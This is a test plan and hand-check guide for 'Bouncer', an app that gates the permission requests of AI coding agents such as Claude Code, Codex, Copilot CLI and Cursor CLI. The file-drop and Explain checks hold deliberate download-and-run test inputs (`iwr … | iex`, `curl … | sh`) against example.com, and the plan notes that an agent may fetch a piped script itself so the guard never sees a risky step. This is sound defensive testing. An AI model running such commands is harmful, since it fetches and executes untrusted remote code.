| CX4 | No guard for Codex | A risky Codex PreToolUse is never asked about, whatever mode it claims (Guard every mode is Claude Code only) | unit, integration | `approvals::tests::the_guard_never_asks_for_codex` `codex_gets_only_allow_or_deny_through_the_real_relay` | CI |
| CX5 | Codex's own reason (`description`) | Shown on the card as "Codex says …", as text, hidden characters visible; never in the input the checks read (same verdict with any reason; a rule still answers); an MCP tool's own `description` argument stays part of the request; the model name, prompt and last message never leave the relay | unit, frontend | `approvals::tests::a_codex_reason_is_shown_and_never_checked` `event::tests::a_codex_command_keeps_its_reason_apart` `event::tests::an_mcp_tool_keeps_every_argument` `tests::the_mark_comes_only_from_the_command_line` `ts: Codex's reason is its own text, labelled, never markup` | CI |
| CX6 | Codex's "Bash" on Windows | Checked as PowerShell (Codex runs it there); compound, unreadable or hidden parts never auto-allowed | unit | `approvals::tests::codex_powershell_is_checked_as_powershell` `event::tests::a_codex_command_keeps_its_reason_apart` | CI |
| CX7 | The installed command line | `& '<relay>' --agent codex` (Windows; every PowerShell quote, curly ones too, doubled) or `'<relay>' --agent codex` (sh); a relay path with quotes, `$(…)`, backticks, `;`, `&`, `%`, brackets runs only the relay through the real shell; look-alikes are never ours | unit, integration | `hooks::tests::codex_commands_quote_the_path_for_each_shell` `hooks::tests::codex_lookalikes_are_not_ours` `a_codex_command_with_an_odd_relay_path_runs_only_the_relay` | CI |
| CX8 | Installing and removing Codex's hooks | `$CODEX_HOME/hooks.json` (else `~/.codex/hooks.json`); one entry per event, the user's own hooks kept, remove gives the file back; status installed / incomplete / moved / missing; the timeouts never change (Codex trusts a hook by its definition); the uninstaller asks for Codex's file after Claude Code's | unit | `hooks::tests::codex_install_status_and_uninstall` `hooks::tests::codex_hooks_path_follows_codex_home` `hooks::tests::codex_timeouts_are_fixed` | CI |
| CX9 | The island | Sessions and cards say Codex; Settings shows "Codex hooks" only where there's a Codex folder, previews by agent, and after installing says to trust them once in Codex | frontend | `ts: sessions and cards name Codex` `ts: Codex's hooks: offered only where Codex is, previewed by agent, trusted once in Codex` | CI |
| CX11 | No test reaches a real profile file | The one resolver of real profile files (`hooks::user_file`) panics under test (core's test build, or `BOUNCER_TEST_GUARD` set) unless the path is inside the temp folder; every CLI test runs hermetic (home, Claude Code's and Codex's folders in its temp folder); `--uninstalling` with a file given touches only that file (PLAN, roadmap h1, incident 2026-10-21) | unit, integration | `hooks::tests::the_test_guard_allows_only_temp_paths` `hooks::tests::user_file_refuses_real_profile_paths_under_test` `the_cli_refuses_a_real_profile_path_under_test` `the_uninstaller_removes_both_agents_hooks_and_a_given_file_only` | CI |
| CX10 | The real Codex 0.163.0 (scratch) | Hooks fire on native Windows (`commandWindows`, run by `powershell -Command`); no output, a crash, exit 1 or 2, a timeout → Codex's own prompt; allow runs it, deny blocks it; trust kept while the hook's definition is the same; through a test instance: the card says Codex with "Codex says …", Allow once runs it, Deny blocks it ("Denied in Bouncer"), a risky one is flagged, Bouncer closed → Codex's own prompt | hand (scratch: fake model, ConPTY, page clicks over CDP) | (PLAN, roadmap h1, steps 1 and 2) | Hand (scratch) 2026-10-20, 2026-10-21 |

## Copilot CLI (roadmap h2)

GitHub Copilot CLI hooks (`--agent copilot --event <name>` on the installed
command, `COPILOT_HOME/hooks/bouncer.json`). Deny or nothing: Bouncer never
allows for Copilot (a hook's allow or ask beats Copilot's own deny rules),
its rules never answer, and every hook command ends in `exit 0` (Copilot
denies the tool when a deciding hook fails). Fixtures recorded from the
real Copilot CLI 1.0.105 with a fake model on 127.0.0.1, offline, no
GitHub sign-in (no Copilot subscription; paths as `dev`). PLAN, roadmap h2.

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| CP1 | Every event Bouncer installs (recorded) | `sessionStart`, `sessionEnd`, `permissionRequest`, `notification` reach the app as Copilot's (`powershell` as PowerShell, `bash` as Bash); only what Bouncer uses leaves the relay (never the prompt or a notification's text); another event's input, a missing or mistyped field, or a spoofed mark is refused | unit, integration, fixture | `copilot_fixtures_reach_the_app_as_copilot_and_only_deny_prints` `tests::copilot_input_becomes_a_marked_line_with_only_what_bouncer_uses` | CI |
| CP2 | Which agent | Only exactly `--agent copilot --event <one of the four>` is Copilot; any other arguments (another event, `preToolUse`, wrong case or order) print nothing | unit, integration | `tests::copilot_runs_only_with_exactly_its_flag_and_an_installed_event` `copilot_fixtures_reach_the_app_as_copilot_and_only_deny_prints` | CI |
| CP3 | Copilot's answers | Only `{"behavior":"deny","message":"Denied in Bouncer"}`, one line of JSON; allow, ask, picks, a plan, no answer or a closed app print nothing | unit, integration | `tests::copilot_gets_exactly_deny_and_nothing_else` `copilot_fixtures_reach_the_app_as_copilot_and_only_deny_prints` | CI |
| CP4 | No allow, no rules for Copilot | A rule that matches (auto mode), a safe request, a risky one with the guard off, or any while paused: no answer at once, no card; the session is working | unit | `approvals::tests::copilot_is_never_allowed_and_carded_only_when_risky_under_the_guard` | CI |
| CP5 | The guard's card for a risky Copilot request | Deny reaches Copilot; "Let Copilot decide" sends nothing; never a "would" or an "Always allow…" rule; the session needs you while it waits | unit, frontend | `approvals::tests::a_risky_copilot_card_denies_or_lets_copilot_decide` `ts: a Copilot card never says Allow` | CI |
| CP6 | An unanswered Copilot card (condition 1) | Times out to "Let Copilot decide" (nothing printed); the card's wait (100 s) < the relay's budget (110 s) < the installed `permissionRequest` timeout (120 s) | unit | `approvals::tests::an_unanswered_copilot_card_times_out_to_let_copilot_decide` | CI |
| CP7 | Where Copilot waits | Its `permission_prompt` notification → "asks in terminal"; `elicitation_dialog` → a question in the terminal; `agent_idle` → idle; never a card | unit | `approvals::tests::copilot_notifications_show_where_copilot_waits` | CI |
| CP8 | The installed command | `& '<relay>' --agent copilot --event <name>; exit 0` (`powershell`) or the same in `bash`; through the real shell it answers deny, and with the relay gone it exits 0 and prints nothing; an odd path runs only the relay; look-alikes (no `exit 0`, another agent or event) aren't ours | unit, integration | `hooks::tests::copilot_commands_quote_the_path_and_lookalikes_are_not_ours` `the_copilot_command_exits_0_even_with_the_relay_gone` | CI |
| CP9 | Installing and removing Copilot's hooks | `$COPILOT_HOME/hooks/bouncer.json` (else `~/.copilot/hooks/bouncer.json`), the folder made if needed; `version` 1, one entry per event, `timeoutSec`, no `preToolUse`; status installed / incomplete / moved / missing; remove leaves `{}` (a user's own entries kept); the diff, a yes, a dated backup; the uninstaller asks third, and kept hooks do no harm; the test guard covers the file | unit, integration | `hooks::tests::copilot_install_status_and_uninstall` `hooks::tests::copilot_hooks_path_follows_copilot_home` `copilot_hooks_install_and_the_uninstaller_removes_them` `hooks::tests::user_file_refuses_real_profile_paths_under_test` `the_cli_refuses_a_real_profile_path_under_test` | CI |
| CP10 | No matcher (condition 4) | No group Bouncer writes, for any agent, carries a `matcher` (Copilot rejects a whole settings file over one empty matcher) | unit | `hooks::tests::bouncer_never_writes_a_matcher` | CI |
| CP11 | The environment (condition 5) | Copilot passes its whole environment to hooks; a secret in it never reaches the app, stdout or stderr | integration | `the_relay_never_forwards_the_environment` | CI |
| CP12 | What Copilot gets, said plainly (condition 2) | Settings' "Copilot CLI hooks" (only where there's a Copilot folder) and the README: watch-only plus Deny on risky commands, no Allow from Bouncer, nothing inside Copilot's sandbox, Copilot CLI 1.0.67 or newer | frontend | `ts: Copilot's hooks: offered only where Copilot is, and say what it gets` `ts: the README says the same` | CI |
| CP13 | The real Copilot CLI (scratch) | Step 1 (1.0.105, 1.0.97, 1.0.67, 1.0.66): formats, failures, `ask`, deny rules, sandbox, versions; end to end through a test instance: see PLAN | hand (scratch: fake model, ConPTY, page clicks over CDP) | (PLAN, roadmap h2, step 1 and end to end) | Hand (scratch) 2026-10-28 |

## Cursor CLI (roadmap h3)

Cursor CLI hooks (`--agent cursor --event <name>` on the installed command,
merged into the user's own `~/.cursor/hooks.json`). Deny or nothing, like
Copilot (Charan, 2026-10-29): the shell hook runs for every command, so
Bouncer never allows for Cursor and its rules never answer. Every hook
command ends in `exit 0`: on Windows Cursor reads a hook's answer only when
its shell exits, and output that isn't valid JSON blocks the command.
Fixtures recorded from the real Cursor CLI 2026.10.22 in a scratch profile
(Charan's free account, Privacy Mode on; paths as `dev`, email replaced).
PLAN, roadmap h3.

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| CU1 | Every event Bouncer installs (recorded) | `sessionStart`, `sessionEnd`, `beforeShellExecution` reach the app as Cursor's, rebuilt: the shell hook as a request (PowerShell on Windows, Bash elsewhere) with its command, the folder from the first workspace root when `cwd` is empty; never the email, the workspace list, the model or the transcript; another event's input is refused | unit, integration, fixture | `cursor_fixtures_reach_the_app_as_cursor_and_only_deny_prints` `tests::a_cursor_line_keeps_only_what_bouncer_needs` | CI |
| CU2 | Which agent | Only exactly `--agent cursor --event <one of the four>` is Cursor; other events (`preToolUse`, `afterShellExecution`), wrong case, missing or extra arguments print nothing and reach nothing | unit, integration | `tests::cursor_runs_only_with_an_event_bouncer_installs` `cursor_fixtures_reach_the_app_as_cursor_and_only_deny_prints` | CI |
| CU3 | Cursor's answers | Only `{"permission":"deny","user_message":"Denied in Bouncer","agent_message":"Denied in Bouncer"}`, one line of valid JSON; allow, ask, picks, a plan, no answer or a closed app print nothing (anything else would block Cursor's command) | unit, integration | `tests::cursor_gets_exactly_deny_or_nothing` `cursor_fixtures_reach_the_app_as_cursor_and_only_deny_prints` | CI |
| CU4 | Deny or nothing in the island | A rule never answers; a card only for a risky request with the guard on: Deny reaches Cursor, "Let Cursor decide" and the timeout send nothing, never a "would" or an "Always allow…"; the history says "left to Cursor" | unit, frontend | `approvals::tests::cursor_gets_deny_or_nothing_like_copilot` `event::tests::the_relay_mark_decides_the_agent` `ts: a Cursor card never says Allow` | CI |
| CU5 | The installed command | `& '<relay>' --agent cursor --event <name>; exit 0` (Windows) or `'<relay>' … ; exit 0`; run as Cursor runs it (its UTF-8 prefix, then its pipe), a non-ASCII command reaches the app byte for byte and it prints exactly the deny; with the relay gone it exits 0 and prints nothing; an odd path runs only the relay; look-alikes aren't ours | unit, integration | `hooks::tests::cursor_commands_quote_the_path_and_lookalikes_are_not_ours` `the_cursor_command_exits_0_even_with_the_relay_gone` | CI |
| CU6 | Installing and removing Cursor's hooks | `~/.cursor/hooks.json`, merged with the user's own hooks (kept, in order, byte for byte after a remove); `version` 1; each event's entry directly in its list (Cursor rejects groups), `command` and `timeout` only, no `preToolUse`, no `matcher`, no `failClosed`; status installed / incomplete / moved / missing; the diff, a yes, a dated backup; the uninstaller asks fourth; the test guard covers the file | unit, integration | `hooks::tests::cursor_install_status_and_uninstall` `hooks::tests::cursor_hooks_path_is_in_the_home_folder` `hooks::tests::bouncer_never_writes_a_matcher` `cursor_hooks_install_and_the_uninstaller_removes_them` `hooks::tests::the_test_guard_allows_only_temp_paths` `the_cli_refuses_a_real_profile_path_under_test` | CI |
| CU7 | Claude Code's hooks under Cursor | Cursor runs `~/.claude/settings.json` hooks (when any group has a matcher) without their `args` and with its own input: with no flag, input carrying `cursor_version`, `user_email` or `workspace_roots` is refused, never reaches the app, prints nothing; none of 970 recorded Claude Code inputs has any of them | unit, integration | `tests::with_no_flag_input_with_cursor_version_is_refused` `tests::with_no_flag_input_with_any_cursor_field_is_refused` `cursor_inputs_without_a_flag_print_nothing_and_never_reach_the_app` | CI |
| CU8 | What Cursor gets, said plainly | Settings' "Cursor CLI hooks" (only where there's a `~/.cursor` folder) and the README: watch-only plus Deny on risky shell commands, no Allow from Bouncer, the user's own hooks kept, tested with Cursor CLI 2026.10.22 | frontend | `ts: Cursor's hooks: offered only where Cursor is, and say what it gets` `ts: the README says the same` | CI; hand 2026-10-29 (Charan, v0.12.0 installed: no Cursor row without `~/.cursor`; with an empty one made by hand, "Cursor CLI hooks · Not installed", tested with 2026.10.22) |
| CU9 | The real Cursor CLI (scratch) | Step 1 (2026.10.22, Windows): events, input, the Windows hang without `exit 0`, deny / garbage / allow vs the deny list / ask; run 4: empty output, Bouncer closed, relay missing, relay crash and hook timeout all fall through; end to end through a test instance: see PLAN | hand (scratch profile, live model, page clicks over CDP) | (PLAN, roadmap h3) | Hand (scratch) 2026-10-29 |

## Ask about this session (roadmap f)

PLAN, roadmap f. Bouncer reads the session itself, builds a redacted log,
shows it whole, and sends it to a chat with no tools only on Send.

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| AS1 | What goes in | Prompts, replies (no thinking), one line per tool call with only `command` / `file_path` / `pattern`; never tool outputs, `content`, `old_string`, `new_string`, `plan`, `questions`, attachments or unknown records | unit | `ask::tests::claude_code_gives_prompts_replies_and_tool_lines_only` | CI |
| AS16 | A tool line is one line | A heredoc's or `python -c`'s lines after the first stay out | unit | `ask::tests::a_tool_line_is_one_line` | CI |
| AS2 | Claude Code's own messages | `isMeta`, `isSidechain`, `isCompactSummary`, `repeatsCompactSummary`, `isVisibleInTranscriptOnly`, tool-result records and user text opening with `<` (`<bash-stdout>`, `<local-command-stdout>` …) stay out | unit | `ask::tests::claude_codes_own_messages_and_subagents_stay_out` | CI |
| AS3 | Codex's file | Only `item_completed` items: `UserMessage`, `AgentMessage` (`text` or `Text` blocks), `CommandExecution` (argv or text, never `aggregated_output`); not `response_item` wrappers or `session_meta` | unit, real file | `ask::tests::codex_gives_its_items_never_outputs_or_wrappers` | CI |
| AS4 | Secrets | `redact_out`, before the preview and before any cut: also spaced signs, `:=`, `?=`, `+=`, `==`, `a=1&token=x`, `password:x`, a quoted value's rest, `mysql -p x`, `setx TOKEN x`; hidden characters shown. The log and a drop's report keep plain `redact`: `key = 1` isn't a secret there | unit | `ask::tests::secrets_go_before_anything_is_shown_and_a_cut_cant_hide_one` `ask::tests::hidden_characters_are_shown_and_markup_stays_text` `redact::tests::outgoing_text_loses_more_than_the_log` `redact::tests::plain_redact_leaves_ordinary_code_alone` | CI |
| AS5 | Size | 40 KB log, newest kept, "(N earlier entries left out)"; 8 MB of the file's end; lines over 1 MB skipped; a running session read to its last complete line | unit | `ask::tests::the_log_keeps_the_newest_within_the_cap` `ask::tests::a_huge_file_is_read_from_its_end_and_huge_lines_are_skipped` `ask::tests::a_running_session_is_read_to_its_last_complete_line` | CI |
| AS6 | Finding the file | By a UUID from Bouncer's own session list, in the agent's own folder, never a hook's path; other IDs, paths and subagent files refused; links refused; never written | unit | `ask::tests::sessions_are_found_by_uuid_in_the_agents_own_folder` `macos: ask::tests::a_link_is_refused` `ask::tests::asking_never_changes_the_session_file` | CI |
| AS7 | Which agents | Claude Code and Codex get Ask; Copilot and Cursor get a line, and Settings says which work | unit, frontend | `ask::tests::only_claude_code_and_codex_sessions_can_be_read` `ts: Ask reads only on the press, and other agents get a line, not a button` `ts: Settings says which agents it works for, and a stale ID is said plainly` | CI |
| AS8 | Where it goes | "Sent to Claude through your Claude Code."; another agent's session also says it leaves that vendor; shown with the preview | unit, frontend | `ask::tests::the_preview_says_where_it_goes_and_what_it_leaves` `ts: the preview says where it goes, shows the backend's text, and can be dropped` | CI |
| AS9 | What's shown is what goes | The prompt is fixed wording, the fenced log, then "Their question:"; the backend holds that text and adds only the typed question; the page sends a single-use ID, held 10 minutes, dropped by × | unit, frontend, integration | `ask::tests::the_prompt_fences_the_log_and_ends_where_the_question_goes` `chat::tests::a_held_session_is_single_use` `chat::tests::a_held_session_expires` `ts: the page sends the held text's ID, never the text` | CI |
| AS10 | No tools | A constant command line differing from `LOCKED` only in `--tools ""` and the system line, never `--resume`; any tool at `init` stops the run; follow-ups stay in it | unit, integration, real run | `chat::tests::the_no_tools_lock_is_locked_plus_no_tools` `chat::tests::any_tool_stops_a_no_tools_run` `a_no_tools_chat_really_has_none` `a_no_tools_run_that_lists_a_tool_is_stopped` | CI |
| AS11 | A log never joins a chat with tools | Send starts a new chat, said with a line (not Ask: × leaves the chat alone); the backend ends any run with tools before taking a log | frontend | `ts: sending the log starts a new chat, said with a line, so it never joins one with tools` | CI |
| AS17 | Failures and leftovers | A failed send keeps the log and the question; a file's Ask drops the log (never both); the page lets go at the 10-minute hold, saying so | frontend | `ts: a send that fails keeps the log and the question` `ts: the log and a file never go together, and the page lets go when the backend does` | CI |
| AS12 | The state matches the design | The prototype has the session-attached chat | frontend | `ts: the prototype has the state` | CI |
| AS15 | Reading a running session's log | A redraw keeps the preview's scroll and keyboard | frontend, real instance | `ts: a redraw keeps the reader's place in the log` | CI |
| AS13 | The whole flow on the app | A test instance with the fake `claude`: Ask, preview, Send, answer; what the fake received equals the preview plus the question | real instance | — | 2026-10-30 |
| AS14 | A real session and a real answer | Hand check after the release | hand | — | Hand; hand 2026-10-30 (Charan, v0.13.0 installed: preview, `[redacted]`, no file body, drop and Ask again, a real answer with no tools); hand 2026-10-30 (Charan, v0.13.2: Ask answered) |

## macOS

| ID | Scenario | Expected | Proof | Test | Status |
| --- | --- | --- | --- | --- | --- |
| M1 | Every automated row above | Passes on macOS too | CI (check, macos-latest) | (all of the above) | CI |
| M2 | The app on a Mac | Launches, takes a session and a request over the real socket, screenshot kept | CI (macOS smoke test) | (`.github/workflows/macos-smoke.yml`) | CI |
| M3 | Installing and using it on a real Mac | Signing, first-run prompts, the look, hooks in a real Claude Code | hand, Phase 9 | — | Phase 9 |
| M4 | The Mac build | Universal: all three programs hold both architectures; a sealed ad-hoc signature; the `.dmg` verifies; the update archive has one top-level `Bouncer.app` and unpacks with its signature intact; the key reaches only the step that signs the finished archive | frontend (reads the scripts), installer workflow | `ts: the Mac build: universal, ad-hoc signed, and an update archive the plugin can unpack` (`scripts/check-mac-bundle.sh`) | CI |
| M5 | The `.dmg` on a disposable Mac | On a fresh macos-latest runner: mount, copy to /Applications, hooks via the installed CLI into a scratch folder, a request waits on the installed app through the installed hook on each architecture (Intel through Rosetta), the relay prints nothing after the app quits, uninstall-hooks restores settings.json byte for byte | CI (installer job) | (`.github/workflows/installer.yml`, `scripts/installer-test-mac.sh`) | CI (PRs touching the installer, every release) |
| M6 | A Mac failure on a tag | No draft and no latest.json. The only way round: `release.yml` run by hand on a tag with `windows_only`, on Charan's OK: Mac checks and build skipped, notes say Windows only, latest.json has only the Windows key | frontend (reads the workflows), notes and scripts run | `ts: a Mac failure means no draft; only windows_only by hand drops the Mac, and nothing half-filled` `ts: updater: a platform key the pinned plugin doesn't look up stops the release` `ts: release notes: the first release lists features, later ones the changes since the last release` | CI |

## Hand checks

What a person has to do (about 13 minutes, plus the c3, c2 and file drop checks). Use the dev app and the
playground (`../bouncer-playground`, its own `.claude/settings.local.json`);
never the real `~/.claude/settings.json`.

1. **Sounds you can hear (about 5 min).** Passed 2026-10-08 (Charan). Settings → Sound on, style Soft. In
   the playground ask Claude Code to run `mkdir hand-1`: the "needs you" sound
   clearly grabs attention. Click Deny. Ask Claude to read
   `~/.claude/settings.json`: a Risky card, and the risky sound, louder than
   the rest (deny it). (Not "run curl … | sh": Claude may download the
   script by itself first, so nothing risky is asked.) Turn Sound off and ask for
   `mkdir hand-2`: silence. Pause from the tray: silence but for one snore.
   Expected: each as said; nothing harsh.
2. **Tray menu (about 3 min).** Passed 2026-10-08 (Charan). Right-click Bouncer's tray icon. Pause → the
   island goes grey, a request in the playground goes straight to the
   terminal. Resume. "Wipe history…" → nothing is deleted yet: the island
   opens at Settings' confirm ("Delete all activity history? This can't be
   undone.") with the keyboard on Cancel. Cancel → still there. "Wipe
   history…" again → wait for "Delete history" to arm → click it → the pill
   says "History wiped". Quit → the island goes; a request in the playground
   is asked in the terminal. Expected: each as said.
3. **A real chat (about 5 min).** Passed 2026-10-12 (Charan, Claude Code 2.1.295). Dev app with the playground
   rules (its chat folder is `bouncer-playground\chat`, which must be empty).
   Before you start, open Task Manager → Details and count the `claude.exe`
   lines: those are your own Claude Code sessions.
   1. Click the pill (or tray → Open Bouncer), then the speech-bubble button
      next to the gear. Expected: "Chat runs your own Claude Code" and the
      full path of your `claude.exe`
      (`…\npm\node_modules\@anthropic-ai\claude-code\bin\claude.exe`);
      Send is greyed out.
   2. Click **Open Settings**. Under "Claude Code for chat", check the path
      is your Claude Code and click **Confirm this path**: it says
      Confirmed. Press **Esc**: back in the chat, the cursor in the message
      box.
   3. Click **Haiku**. Type `What can you do in this chat?` and press
      **Enter**. Expected: the answer streams in and says it's read-only
      (it can't edit files, run commands or use the web); the line at the
      bottom shows your plan's 5-hour and 7-day use; Task Manager shows one
      more `claude.exe`.
   4. Type `Read ../rules.toml and tell me its first line.` and press
      **Enter**. Expected: a "Read …rules.toml" chip, then a dashed
      "Not allowed · Read · --restricted: path outside the working
      directory", and Claude says it couldn't read it.
   5. Type `Write a 400-word story about a bouncer.`, press **Enter**, and
      while it streams click **Cancel**. Expected: it stops, then
      "Cancelled." and a "New chat" line.
   6. Type `What was my first question?` and press **Enter**. Expected: it
      doesn't know (a new chat). Click **+** (New chat, top right): the
      panel is empty again.
   7. Tray → **Quit Bouncer**. Wait a few seconds and look at Task Manager
      → Details again. Expected: the `claude.exe` count is back to what it
      was before step 1 (none of Bouncer's left).
   8. Check `bouncer-playground\chat` is still empty.
4. **Guard every mode in a terminal (about 8 min).** Driven 2026-10-14 by
   Claude through a pseudo console (Claude Code 2.1.299, the test instance;
   PLAN, c2): all six steps passed. Dev app
   from the c3 branch and the playground (its `.claude/settings.local.json`
   runs `target\debug\bouncer-hook.exe`). First `cargo build -p
   bouncer-relay` (so the playground's relay has the guard), then `npm run
   tauri dev`.
   1. Settings → **Guard every mode**. Expected: Off, after Auto-allow; the
      hint says what it changes (auto, accept-edits, bypass; `claude -p`
      refused). Turn it On: the island shows "Rules changed: guard on" and
      `bouncer-playground\rules.toml` has `guard = true`.
   2. In `bouncer-playground`: `claude --dangerously-skip-permissions`
      (bypass mode; accept its warning). Ask Claude to read
      `~/.claude/settings.json` (this is what worked in the v0.8.1 check; a
      "run curl … | sh" ask may only download the script, so nothing risky
      reaches the guard). Expected: Claude Code's own prompt (reason
      "Bouncer flagged this request as risky (Guard every mode).") and
      Bouncer's Risky card. **Deny** in the island: Claude Code says it was
      denied.
   3. Ask: "Run `echo guard-safe`". Expected: it runs, no prompt, no card.
   4. Shift+Tab to **auto** mode, ask it to read `~/.claude/settings.json`
      again. Expected: prompt and card; **Allow once** in the island: it
      reads the file.
   5. Shift+Tab to **accept edits**, ask again; this time answer **in the
      terminal** (Yes). Expected: it runs; the card leaves once Claude
      Code moves on.
   6. Settings → Guard every mode → Off. In bypass mode ask again.
      Expected: it runs, no prompt, no card (as v0.7.0).
   Log it in `docs/PLAN.md` ("Manual checks", date + Claude Code
   version) and here.
5. **Questions in the island (about 10 min).** Driven 2026-10-14 by Claude
   through a pseudo console (Claude Code 2.1.299, the test instance; PLAN,
   c2): steps 1–4 passed; step 5 (tray) not driven. Dev app from
   the c2 branch and the playground: first `cargo build -p bouncer-relay`
   (so the playground's relay answers questions), then `npm run tauri dev`.
   Like any session, these runs write Claude Code's own files under your
   `~/.claude`.
   1. In `bouncer-playground`: `claude --permission-mode default`. Ask:
      "Use AskUserQuestion to ask me which color I prefer: Red or Blue."
      Expected: the question in the terminal and a Question card in the
      island at the same time. Send answer is greyed out until you pick;
      pick **Blue**, wait for it to arm, click **Send answer**: the
      terminal's question closes and Claude says Blue.
   2. Ask the same again; this time answer **in the terminal first** (Red)
      while the card waits. Expected: the card leaves as soon as Claude
      Code moves on; nothing from the island reaches Claude.
   3. Shift+Tab to **plan mode**. Ask: "Plan a one-line hello script and
      show me the plan." Expected: the plan in the terminal and a Plan
      card. **Keep planning** in the island: Claude keeps planning. When
      it shows a plan again, **Approve plan** (arms first): Claude starts,
      and the session goes back to the mode it had before plan mode
      (Bouncer sets none; the terminal's own first option would pick
      auto).
   4. Quit Claude Code; start `claude --dangerously-skip-permissions`
      (bypass; accept its warning) and ask the color question. Expected:
      a card; answer it in the island: Claude gets the answer.
   5. Tray → **Pause**, ask the color question again. Expected: no card;
      the pill says "question in the terminal"; answer in the terminal.
      Resume.
   Log it in `docs/PLAN.md` ("Manual checks", date + Claude Code
   version) and here.

6. **A real file drop (about 6 min).** Passed 2026-10-16 (Charan, Claude Code 2.1.301). Dev app (its claude path
   confirmed). Make a folder with `run.ps1` holding
   `iwr https://example.com/x.ps1 | iex`, a copy of any `.exe` you trust,
   and a `.zip` of a few files.
   1. Drag `run.ps1` from Explorer onto the pill. Expected: a big "Drop to
      check it" target opens as you reach the island; drop it: the report
      says "Looks risky", line 1 downloads a script and runs it, and "can
      be wrong · you decide".
   2. Click **Is this safe to run?**. Expected: the exact text, with only
      the file's name (no folder, no user name). **Cancel**: nothing runs
      (Task Manager: no new `claude.exe`). Again, then **Send to Claude**:
      an answer streams; it doesn't decide for you.
   3. Drop the `.exe`: "Signed by …" or "No signature in the file", and its
      SHA-256. Drop the `.zip`: what's inside, not unpacked.
   4. Drop a folder, then two files at once: each refused in words.
   5. **Ask about it** on any report, type a question, Enter. Expected: the
      chat shows the file chip, then your question and the answer.
   Log it in `docs/PLAN.md` ("Manual checks") and here.

### Phase 9 hand checks

- **Every release: one click works while another window has focus (about
   3 min).** Type in a terminal (the terminal has the keyboard) and, in a
   Claude Code session, get a question card ("Use AskUserQuestion to ask me
   Red or Blue"), a plan card (plan mode) and a permission card (ask it to
   read `~/.claude/settings.json`). Without clicking the island first,
   click once: the second option, then Send answer at once (as fast as you
   can); Keep planning; Deny (and on a new card, Explain, then Allow once
   after it arms). Then click the gear once. Expected: each single click
   works the first time (Send answers right after the pick; Settings opens
   and stays); the focus ring sits on what you clicked, never on
   another option or on Deny. The card arriving never takes your typing.
- **Every release: the guard in bypass mode (about 2 min).** Settings →
   Guard every mode → On. `claude --dangerously-skip-permissions`, ask
   Claude to read `~/.claude/settings.json`. Expected: Claude Code's
   prompt and the Risky card; Deny stops it. (Not "run curl … | sh": that
   may only download the script.) Turn the guard back to how you had it.
- **Every release: Settings changes don't freeze (about 2 min).** Passed
   2026-10-16 (Charan, the v0.8.1 draft: every control, no freeze). With the
   installed draft running, open Settings and change, one at a time: Size
   (Small, Medium, Large), Sound off and on, Sound style (Playful, Soft),
   Volume (drag it), one switch under Which sounds, Shortcut Ctrl+Alt+B off
   and on, Guard every mode on and off, Check for updates off and on.
   Expected after each: the island answers at once (Settings scrolls, the
   next click works); Windows never shows "Not responding". (0.8.0's draft
   froze on Size; PLAN, "Settings freeze".)

- **v0.7.0 on a real desktop (about 15 min).** Passed 2026-10-13 (Charan,
   Claude Code 2.1.295, the draft's installer): install, SmartScreen, hooks
   from Settings, a real session in the island, chat, Ctrl+Alt+B, Start
   with Windows, uninstall with the hooks removed. Step 10 (reinstall)
   skipped: CI's installer test covers it (W10). Step 5 (risky card, Explain,
   Deny) not run. Not in the report: the hash check and a card with Deny /
   Allow (step 4). Those are covered by CI (A1, A8, E1–E8) and the c-7
   test-instance runs (W12).
   Charan, on his own desktop from Explorer and Edge (outside any app's
   container; no Windows Sandbox on Windows 11 Home). Quit the dev app
   first: the release has its own folders, pipe and WebView2 data, so
   nothing of the dev app is touched. Copy `~/.claude/settings.json` to
   somewhere safe before step 3. The update isn't checked here (there's no
   newer version yet; CI's installer test covers it, W10).
   1. **Download.** Open the v0.7.0 draft on GitHub (Releases), download
      `Bouncer_0.7.0_x64-setup.exe` and `SHA256SUMS.txt`. Expected: the
      notes say "First public release" with the feature list.
   2. **Check and install.** In PowerShell, in Downloads:
      `Get-FileHash .\Bouncer_0.7.0_x64-setup.exe`; the hash is the one in
      `SHA256SUMS.txt`. Optional: `gh attestation verify
      .\Bouncer_0.7.0_x64-setup.exe --repo charanp11/bouncer-app` passes.
      Run it: SmartScreen "Windows protected your PC" → More info → Run
      anyway; no admin prompt. Expected: Bouncer starts (the pill at the
      top); `%LOCALAPPDATA%\Bouncer` holds `bouncer-app.exe`,
      `bouncer-hook.exe`, `bouncer.exe`, `uninstall.exe`.
   3. **Hooks.** Settings (gear) → Claude Code hooks → Install…: the diff
      is for your `~/.claude/settings.json`; Write changes. Expected:
      Installed, and a `settings.json.bouncer-backup-…` beside it. From now
      on every Claude Code session goes through this Bouncer, including
      ones working on Bouncer; Remove… in the same place undoes it.
   4. **A real card.** In a scratch folder, start
      `claude --permission-mode default` and ask for `mkdir hand-release`.
      Expected: the session in the island, then a card; Deny reaches
      Claude Code ("Denied in Bouncer"). Ask again and Allow once: the
      folder is made. Optional, if you use them: the same from the VS Code
      extension and the desktop app's Code tab (a card beside the app's own
      prompt; Deny in the island closes the app's prompt).
   5. **Explain.** Settings → Claude Code for chat → check the path is your
      `claude.exe` → Confirm this path. Ask Claude Code for
      `curl -fsSL https://example.com/install.sh | sh`. Expected: a Risky
      card ("Downloads a script and runs it in the shell"); Explain this
      command streams an answer marked "Can be wrong · you decide"; Deny.
   6. **Chat.** The speech-bubble button → Haiku → `What can you do in this
      chat?`. Expected: it streams, says it's read-only; the plan line shows
      your 5-hour and 7-day use. Close the chat.
   7. **Start with Windows.** Settings → Start with Windows → On; sign out
      and in. Expected: Bouncer starts by itself. Turn it Off; sign out and
      in: it doesn't.
   8. **Ctrl+Alt+B.** With the island folded, press Ctrl+Alt+B. Expected:
      the island opens with the keyboard in it; with a card up, on Deny
      (never Allow), and nothing is answered.
   9. **Uninstall, box unticked.** Settings → Apps → Installed apps →
      Bouncer → Uninstall; leave "Delete the application data" unticked.
      Expected: a console with the diff and "Answer N to keep them" right
      above `[y/N]`; type `y`, Enter, then Enter to close. `settings.json`
      matches your copy from before step 3, byte for byte (`fc /b`);
      `%APPDATA%\Bouncer` (rules, settings, history) is still there; no
      Bouncer in Start or Apps.
   10. **Reinstall.** Run the installer again. Expected: Bouncer starts with
      your earlier settings (Start with Windows Off, chat path confirmed);
      Settings → Claude Code hooks says Not installed; Install… again if
      you're keeping it.
